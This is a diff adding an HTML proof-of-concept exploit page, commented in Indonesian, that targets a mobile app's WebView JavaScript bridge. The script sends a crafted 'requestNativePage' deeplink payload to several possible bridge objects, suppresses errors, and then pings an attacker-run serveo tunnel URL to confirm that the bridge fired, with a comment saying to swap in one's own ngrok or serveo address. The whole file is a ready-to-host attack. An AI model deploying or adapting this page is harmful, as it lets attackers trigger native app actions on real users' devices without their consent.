@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body style="background-color: #282a36; color: #ff79c6;">
+    <h1>Shuvy Bridge Exploit PoC</h1>
+    <script>
+        // Payload jahat yang meniru struktur asli aplikasi
+        var payloadObj = {
+            action: "requestNativePage",
+            deeplink: "sapphire://searchSettings"
+        };
+        var payload = JSON.stringify(payloadObj);
+
+        // Menembak membabi buta ke semua kemungkinan nama bridge
+        try {
+            if (window.PageJSBridge && window.PageJSBridge.postMessage) {
+                window.PageJSBridge.postMessage(payload);
+            } else if (window.sapphireWebViewBridge && window.sapphireWebViewBridge.postMessage) {
+                window.sapphireWebViewBridge.postMessage(payload);
+            } else if (window.Android && window.Android.postMessage) {
+                window.Android.postMessage(payload);
+            }
+        } catch(err) {
+            // Diam jika error
+        }
+
+        // Lapor ke server Python milikmu
+        // GANTI URL INI DENGAN NGROK/SERVEO MILIKMU
+        var target = "https://b9f84b5b7061c1df-203-83-40-39.serveousercontent.com/?bukti=bridge_tetiklendi";
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", target, true);
+        xhr.send();
+    </script>
+</body>
+</html>
